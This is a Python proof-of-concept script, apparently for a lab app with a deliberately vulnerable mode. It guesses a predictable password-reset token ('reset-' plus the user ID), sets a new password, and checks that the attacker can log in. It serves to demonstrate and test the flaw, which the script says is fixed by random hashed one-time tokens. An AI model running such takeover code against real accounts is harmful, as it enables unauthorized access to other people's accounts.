from __future__ import annotations

import argparse
import http.cookiejar
import urllib.parse
import urllib.request


def post(opener: urllib.request.OpenerDirector, url: str, data: dict[str, str]) -> str:
    encoded = urllib.parse.urlencode(data).encode()
    request = urllib.request.Request(url, data=encoded, method="POST")
    try:
        with opener.open(request, timeout=5) as response:
            return response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.read().decode("utf-8", errors="replace")


def main() -> None:
    parser = argparse.ArgumentParser(description="PoC: predictable reset token")
    parser.add_argument("--base", default="http://127.0.0.1:8000")
    parser.add_argument("--email", required=True)
    parser.add_argument("--user-id", type=int, default=1)
    parser.add_argument("--new-password", default="hacked123")
    args = parser.parse_args()

    base = args.base.rstrip("/")
    token = f"reset-{args.user_id}"
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    reset_body = post(opener, f"{base}/reset", {"token": token, "password": args.new_password})
    changed = "Password changed" in reset_body
    print(f"Guessed token: {token}")
    print(f"Reset accepted: {changed}")

    login_body = post(opener, f"{base}/login", {"email": args.email, "password": args.new_password})
    logged_in = "Logged in as" in login_body or "Dashboard" in login_body
    print(f"Login with new password accepted: {logged_in}")
    print("\nThis should work only against vulnerable mode. Fixed mode uses random hashed one-time tokens.")


if __name__ == "__main__":
    main()
